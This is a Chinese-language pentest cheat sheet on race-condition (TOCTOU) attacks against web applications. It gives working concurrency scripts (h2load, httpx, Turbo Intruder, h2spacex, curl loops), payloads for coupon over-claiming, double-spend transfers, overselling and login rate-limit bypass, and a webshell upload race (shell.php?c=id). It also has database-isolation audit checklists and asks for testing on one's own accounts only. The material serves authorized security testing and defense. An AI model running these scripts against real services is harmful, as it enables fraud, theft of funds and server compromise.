## 0. 判据速查

| 现象 | 判据 | 打法 |
|---|---|---|
| 一次性资源（券/签到/邀请奖励）并发 N 次，成功 > 1 | 限制未原子化 | 同请求 N 并发，数业务成功码 |
| 余额刚好够 1 笔，2 笔并发都成功，余额转负 | 读-判-写非原子 | 双花，看最终余额 |
| 库存 1，并发下单出多单 | 检查与扣减分离 | 数订单数 vs 库存 |
| 并发失败响应里有"版本冲突" | 乐观锁已生效 | 换接口或换资源再试 |
| 并发响应时间呈阶梯状 | 悲观锁/分布式锁生效 | 该路径已修，找未加锁的旁路接口 |
| 限速上限 5，一次并发 20 全过 | 计数器 check-then-increment | 并发 vs 串行对照 |
| 上传后立刻访问能执行 | 检测与删除之间有窗口 | 上传线程 + 疯狂访问线程 |
| 邮件/手机验证与升级操作并发 | 验证未提交即被消费 | 单包同时打 verify + upgrade |
| 响应时间 > 100ms | 窗口大，并发数可放大 | 先测耗时再定并发 |

## 1. TOCTOU：唯一根因

```text
线程A                      线程B
  +-- 检查（资源可用）        |
  |                          +-- 检查（资源可用）   ← 两边都看到"可用"
  +-- 使用 / 更新            |
  |                          +-- 使用 / 更新        ← 效果重复
```

**判据**：`检查`与`修改`不是同一步原子操作，就存在窗口。剩下的只是"窗口够不够大、能不能压进去"。

典型脆弱流程：

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

两个并发请求都能在任一 `UPDATE` 提交前通过 `if`。

### 1.1 锁在哪一层漏

| 层 | 漏法 |
|---|---|
| 应用 | 内存标志 / 缓存 / session 说"还没用过"，DB 已改；或反之 |
| ORM / 服务 | 多实例无分布式锁，各自以为自己是决策者 |
| DB | 缺 `SELECT … FOR UPDATE`、隔离级别不当、逻辑拆在多个语句外无事务 |
| API 网关 | 按 IP 限速是 check-then-increment，并发一波全过 |

**`UNIQUE` 约束与幂等键能整类消灭这类 bug**——先测应用有没有在热路径上真正启用。

## 2. 先按优先级找接口

| 优先级 | 操作类型 | 典型路径/参数 |
|---|---|---|
| 1 | 一次性领取 / 券 / 红包 | `redeem`、`apply_coupon`、`claim_reward`、`voucher` |
| 2 | 余额 / 配额 / 库存扣减 | `transfer`、`purchase`、`reserve`、`inventory` |
| 3 | 邀请 / 推荐 / 注册奖励 | `invite_accept`、`referral_claim` |
| 4 | 密码 / 邮箱 / MFA 验证 | `verify_token`、`confirm_email`、`reset_password` |
| 5 | 看似幂等但无强键的 `POST` | 每用户只应成功一次的那些 |

**起手三步**：抓状态变更请求 → 按工具能力上限并发 20–100 份 → 分类结果（**0/1 次成功** vs **N 次成功** / **终态不一致**）。

> 不只是券和余额。邮件验证、OAuth 绑定、"确认所有权"这类流程同样是高价值目标（CVE-2022-4037 就是 GitLab 的邮箱验证竞态，可伪造已验证邮箱，进而影响 OAuth 身份提供方场景，CWE-362）。

## 3. 并发怎么打进去

### 3.1 HTTP/2 单包（首选）

多路复用把多个完整请求的帧合并，让它们的首字节在**同一个 TCP 段**里出去，服务端派发间隔 **< 100μs**。

```bash
# h2load（nghttp2）
h2load -n 50 -c 1 -m 50 \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"couponId":"NEWUSER100"}' \
  https://target.com/api/coupon/claim
# -n 总请求数 / -c 并发连接数（设 1 才是单包）/ -m 每连接最大流数 / -d POST body
```

```python
import asyncio, httpx

async def burst(url, headers, data, n=50):
    async with httpx.AsyncClient(http2=True) as client:
        rs = await asyncio.gather(*[client.post(url, headers=headers, json=data)
                                    for _ in range(n)])
        return rs
```

**为什么压得进**：Nagle 算法（RFC 896）默认开启，客户端连续写多个 HEADERS+DATA 帧且不 flush 时，内核把它们合进一个 TCP 段。**前提是 `TCP_NODELAY` 关闭**；若开了，就得用 `writev()` 聚写。MSS 约 1460 字节，一条段里大约塞 **20–30 个小请求**，超了就分片、同步性崩掉。

服务端侧：一次 `recv()` 拿到整段 → HTTP/2 解复用 → 扇出到 worker 池，首末请求派发间隔 **< 100μs**。

### 3.2 HTTP/1.1 末字节同步

每个连接把请求发到**只剩最后一个 body 字节**，全部就位后同时释放最后那一个字节。

```text
Client 1: [headers + body - 1B] ----hold----+
Client 2: [headers + body - 1B] ----hold----+--> 同时 flush 最后 1 字节
Client N: [headers + body - 1B] ----hold----+
```

比 Repeater 里顺序粘贴好，但仍受各连接独立 RTT 影响，派发间隔 **1–5ms**。

| 对比项 | HTTP/2 单包 | HTTP/1.1 末字节 |
|---|---|---|
| 需要连接数 | 1 | N（每请求一条） |
| 线缆同步 | 同一 TCP 段 | N 个段"同时"释放 |
| 网络抖动影响 | 零 | 每连接独立 RTT |
| 服务端派发间隔 | < 100μs | 典型 1–5ms |
| 实用上限 | 每 MTU 约 20–30 个 | 受连接建立限制 |

### 3.3 Turbo Intruder（gate 模式）

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0)
    for _ in range(30):
        engine.queue(target.req, gate='race1')   # 全部先挂住
    engine.openGate('race1')                     # 同时放行

def handleResponse(req, interesting):
    table.add(req)
```

基础请求里留一个 `x-request: %s` 头，Turbo Intruder 会按 payload 逐条替换，便于日志里对号。

### 3.4 多端点同 gate（把窗口撑开）

一个改状态的 POST + 一堆读侧 GET 一起放，用来观察 TOCTOU 窗口：

```python
engine.queue(post_to_target1, gate='race1')
for _ in range(30):
    engine.queue(get_target2, gate='race1')
engine.openGate('race1')
```

### 3.5 h2spacex（底层单包）

```python
import h2spacex

c = h2spacex.H2OnTCPSocket(hostname='target.example.com', port_number=443)
c.setup_connection()
c.send_ping_frame()

hdrs = [[(':method','POST'), (':path','/api/v1/rewards/claim'),
         (':authority','target.example.com'), (':scheme','https'),
         ('content-type','application/json'), ('authorization','Bearer TOKEN')]
        for _ in range(20)]

c.send_multiple_requests_at_once(hdrs, body_list=[b'{"reward_id":"welcome_bonus"}']*20)
responses = c.read_multiple_responses()
```

### 3.6 其他

```bash
# curl 并发（抖动大，效果差）
for i in $(seq 1 20); do curl -s -X POST "$URL" -H "$H" -d "$D" & done; wait

# GNU parallel（控制更好）
seq 1 20 | parallel -j 20 "curl -s -X POST '$URL' -H '$H' -d '$D'"
```

Python 线程版（`threading`）抖动最大，只在窗口 >100ms 时够用；**优先 HTTP/2 单包**。

## 4. 五类打法

### 4.1 限额超发（券/红包/投票/签到）

```http
POST /api/v1/rewards/claim HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

并发 20 份同一请求。**成功信号**：`200`/`201` 出现多次、台账重复、余额高于策略上限。

变体：同一券跨不同购物车项；`apply-coupon` 与 `checkout` 并发（券只在结算时扣）。

### 4.2 双花

```text
目标: POST /api/transfer {"to":"attacker","amount":100}
余额: 刚好 100
打法: 2 份以上并发
证据: 都成功，付款方余额转负，收款方收到 200
```

更高价值变体：提现到外部系统（加密货币、银行转账），撤销困难。

### 4.3 库存超卖

```text
目标: POST /api/purchase {"item_id":"limited_edition","qty":1}
库存: 剩 1
打法: 20 份并发
证据: 生成多单，库存计数转负
```

复合型：加购与结算各查一次库存，两条链路独立校验。

### 4.4 限速绕过

```http
POST /api/v1/login HTTP/1.1
{"email":"victim@example.com","password":"wrong"}
```

一波并发 N 次 vs 串行 N 次对照。**成功信号**：接受次数超过文档上限，或一波全在同一窗口内完成导致锁定从不触发。

### 4.5 多步流程越权（打穿流水线）

流程 `create → pay → confirm`，若 `confirm` 未与 `pay` 完成做密码学绑定：

1. 同一 session / 同一 item 起两条并行流水线；
2. 在 A 的 `pay` 还在飞行（或已放弃）时，完成 B 的 `confirm`。

**成功信号**：未付即标记已付/已发货，或状态回退。

### 4.6 上传后删除（webshell 竞速）

```text
线程1: 上传 shell.php
线程2: 循环 GET /uploads/shell.php?c=id，命中 200 即成功
```

适用：上传后被恶意检测删除、或先落临时文件再校验的场景。

### 4.7 验证码并发

同一验证码并发提交，看是否被多次消费。**只用于打通登录/改密**；纯短信轰炸不写报告。

## 5. 单包打多端点（窗口最宽）

不是 N 份同一请求，而是**一次单包内打不同端点**，同时命中"检查"与"使用"两条路径。

**Pattern 1：读状态 + 改状态**

```text
Stream 1: GET  /api/balance      ← 探前态
Stream 3: POST /api/transfer     ← 改
Stream 5: POST /api/transfer     ← 改（重复）
Stream 7: GET  /api/balance      ← 探后态
```

Stream 1 与 Stream 7 的余额不一致，即证明窗口被命中。

**Pattern 2：跨资源**

```text
Stream 1: POST /api/coupon/apply    ← 打折
Stream 3: POST /api/order/checkout  ← 结算
```

两条链路独立算价时，折扣可能在结算锁价之后才生效。

**Pattern 3：验证 + 特权操作**

```text
Stream 1: POST /api/email/verify?token=TOKEN   ← 验邮箱
Stream 3: POST /api/account/upgrade            ← 要求邮箱已验证
```

在验证"处理中但未提交"的瞬间完成升级。

```python
all_h = [hdrs_balance] + [hdrs_transfer]*5 + [hdrs_balance]
all_b = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']
c.send_multiple_requests_at_once(all_h, body_list=all_b)
```

Burp Repeater：把**不同路径**的请求加进同一 group → `Send group (single packet)`。

## 6. 数据库隔离级别对应的窗口

| 隔离级别 | 利用的现象 | 攻击窗口 | 典型脆弱写法 |
|---|---|---|---|
| READ UNCOMMITTED | 脏读 | B 读到 A 未提交的写 | `SELECT balance` 看到飞行中的扣减，据此继续走逻辑 |
| READ COMMITTED | 不可重复读（TOCTOU） | 两边都读到已提交余额，都过检查，都扣 | `SELECT` → 应用判断 → `UPDATE`，无 `FOR UPDATE` |
| REPEATABLE READ | 幻读 | 快照隔离隐藏并发插入，两边都看到"0 次领取"然后插入 | `INSERT IF NOT EXISTS` 但无 UNIQUE 约束 |
| SERIALIZABLE | 建议锁绕过 | 应用用 `pg_advisory_lock()`/`GET_LOCK()`，作用域或键可推导 | 锁键来自用户输入；会话级 vs 事务级作用域错配 |

### READ COMMITTED TOCTOU（生产最常见）

```sql
-- 线程 A                            -- 线程 B
SELECT balance FROM accounts          SELECT balance FROM accounts
  WHERE id=1;  -- 100                   WHERE id=1;  -- 100
-- 应用: 100 >= 100 ✓                 -- 应用: 100 >= 100 ✓
UPDATE accounts SET balance =         UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- 0                          COMMIT; -- -100  ← 双花
```

**修好的判据**：`SELECT ... FOR UPDATE` 会让 B 的 SELECT 阻塞到 A 提交。

### REPEATABLE READ 幻读插入

```sql
-- 两边快照都看到 0 条
SELECT count(*) FROM claims WHERE user_id=1 AND coupon='X';  -- 0 / 0
INSERT INTO claims ...;   -- 都成功 → 重复领取
```

**修好的判据**：`UNIQUE(user_id, coupon_id)` 会让其中一条 INSERT 报重复键，与隔离级别无关。

### SERIALIZABLE 建议锁绕过的三条路

```sql
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- 1. 锁是会话级但事务回滚 → 锁残留，下个事务直接跳过
-- 2. 另一条代码路径进领取逻辑时没取锁
-- 3. 攻击者走另一个不加锁的 API 端点触发领取
```

### 审计五问

```text
□ SHOW TRANSACTION ISOLATION LEVEL —— 实际跑在哪一级
□ 热路径有没有 SELECT ... FOR UPDATE 或显式行锁
□ 检查-动作序列是否在同一个事务内
□ 关键状态表有没有 UNIQUE 约束
□ 多实例部署有没有分布式锁（Redis SETNX / Zookeeper）
```

## 7. 怎么判定成功

**证据三件套**（缺一不可）：

1. **可复现**：并行下重复成功，不是偶发单次重试。
2. **服务端留痕**：两行记录、两封邮件、两份发放，或终态余额错误。
3. **可对号**：用 `x-request` 之类标记或唯一 body 字段与日志对应（仅授权环境）。

四种取证口径：

```text
# 余额/积分
before - after > 预期扣减  → 扣款异常

# 重复记录
SELECT coupon_id, user_id, COUNT(*) c FROM user_coupons
 WHERE user_id='TEST_USER' GROUP BY coupon_id, user_id HAVING c > 1;

# 库存
len(orders) > stock  → 超卖

# 业务状态码（最可靠）
成功响应里业务码为 0 的条数 > 1（对一次性资源）→ 成立
```

**只看 HTTP 200 不够**——很多实现失败也返 200，必须看业务码或终态数据。

## 8. 防护检测

```text
1. 悲观锁（DB 锁）      并发时后续请求等待 → 响应时间呈阶梯状增长
2. 乐观锁（版本号）      只有一个成功，其余返回"版本冲突" → 看错误文案
3. 分布式锁（Redis）     行为类似悲观锁 → 响应时间分析
4. 幂等设计             重复请求返回相同结果、无副作用 → 多次发同一请求比对
```

判到已加锁就**换接口**，别在同一路径上死磕。

## 9. 决策树

```text
起点：这是状态变更接口吗？
  否 → 停
  是 → 一次性 / 余额 / 验证 类？
        ├ 券类        → 同请求并行 → 重复成功？ → 是:取证 / 否:换 HTTP/2 单包
        ├ 限速        → 并行 vs 串行对照 → 超上限？ → 是:取证 / 否:换 TI gate
        └ 多步流程    → 并行流水线 → 状态错乱？ → 是:取证 / 否:逐步骤深挖
```

工具选择：Burp `Send group (parallel)` / `single-packet` → h2spacex → Turbo Intruder gate → Raceocat。

## 10. 纪律

1. **只在自己的测试账号上打**，不碰其他用户数据。
2. **并发 ≤ 50**，避免打成 DoS；窗口大时再放大，但别一上来就 500。
3. **判据是业务成功次数，不是 HTTP 状态码**。失败返 200 的实现很常见。
4. **先测响应耗时再定并发**。>100ms 才值得上大并发；<20ms 的窗口用线程版几乎打不中。
5. **优先 HTTP/2 单包**。HTTP/1.1 末字节和线程池的抖动是 1–5ms 级，差两个数量级。
6. **`TCP_NODELAY` 开着时单包不成立**，要靠 `writev()` 聚写，别以为工具设了 `-c 1` 就一定同步。
7. **一条段只塞 20–30 个小请求**，超了会分片，同步性反而更差。
8. **已加锁就换路径**，不在同一接口反复重试。
9. **验证码并发只为打通登录/改密才报**；纯短信轰炸不写。
10. **测试后检查账户状态**，有异常立即报告；PoC 存前后余额/积分与全部请求响应。
11. 场景偏业务规则/定价/流程绕过时，改走 `web/漏洞分类/业务逻辑/逻辑漏洞.md`；本页只管**并发与传输层同步**。
